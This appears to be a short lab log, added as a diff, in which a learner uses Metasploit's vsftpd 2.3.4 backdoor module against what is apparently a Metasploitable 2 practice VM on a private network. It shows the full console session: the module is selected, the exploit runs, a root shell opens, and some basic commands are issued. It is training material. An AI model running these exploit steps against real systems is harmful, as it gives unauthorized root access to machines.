@@ -1,0 +1,100 @@
+HERE I EXPLOITED THE MET2 SERVER BY vspt ftp VULN AND GAINED THE ACCES OF THE VICTINES CMD .
+
+
+
+
+
+
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) > search vsftp
+
+Matching Modules
+================
+
+   #  Name                                  Disclosure Date  Rank       Check  Description
+   -  ----                                  ---------------  ----       -----  -----------
+   0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution
+
+
+Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/ftp/vsftpd_234_backdoor
+
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) > use exploit/unix/ftp/vsftpd_234_backdoor
+[*] Using configured payload cmd/unix/interact
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set rhost 192.168.64.4
+rhost => 192.168.64.4
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit
+
+[*] 192.168.64.4:21 - The port used by the backdoor bind listener is already open
+[+] 192.168.64.4:21 - UID: uid=0(root) gid=0(root)
+[*] Found shell.
+[*] Command shell session 1 opened (10.211.55.3:44719 -> 192.168.64.4:6200) at 2024-02-24 18:59:40 +0530
+
+ifconfig
+eth0      Link encap:Ethernet  HWaddr 9e:5e:ad:11:e5:f7  
+          inet addr:192.168.64.4  Bcast:192.168.64.255  Mask:255.255.255.0
+          inet6 addr: fdc9:a373:50d8:a2b3:9c5e:adff:fe11:e5f7/64 Scope:Global
+          inet6 addr: fe80::9c5e:adff:fe11:e5f7/64 Scope:Link
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:425873 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:424891 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1000 
+          RX bytes:34840853 (33.2 MB)  TX bytes:23166938 (22.0 MB)
+          Base address:0xc000 Memory:febc0000-febe0000 
+
+lo        Link encap:Local Loopback  
+          inet addr:127.0.0.1  Mask:255.0.0.0
+          inet6 addr: ::1/128 Scope:Host
+          UP LOOPBACK RUNNING  MTU:16436  Metric:1
+          RX packets:127 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:127 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:0 
+          RX bytes:36021 (35.1 KB)  TX bytes:36021 (35.1 KB)
+
+ls
+bin
+boot
+cdrom
+dev
+etc
+home
+initrd
+initrd.img
+lib
+lost+found
+media
+mnt
+nohup.out
+opt
+proc
+root
+sbin
+srv
+sys
+tmp
+usr
+var
+vmlinuz
+whoami
+root
+cd msfadmin
+sh: line 9: cd: msfadmin: No such file or directory
+cd home
+ls
+ftp
+msfadmin
+service
+user
+cd msfadmin
+ls
+vulnerable
+mkdir adi.txt
+ls
+adi.txt
+vulnerable
+ls
+cd ..
+ls
+ls
+^C
+Abort session 1? [y/N]  y
+
+[*] 192.168.64.4 - Command shell session 1 closed.  Reason: User exit
